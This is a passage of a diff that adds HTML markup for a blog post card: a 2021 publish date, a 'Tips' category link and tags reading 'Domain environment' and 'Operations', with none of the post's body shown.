+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-01
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Tips/" class="post-category">
+                                    Tips
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Domain-environment/">
+                        <span class="chip bg-color">Domain environment</span>
+                    </a>
+                    
+                    <a href="/tags/Operations/">
+                        <span class="chip bg-color">Operations</span>
                     </a>
                     
                 </div>
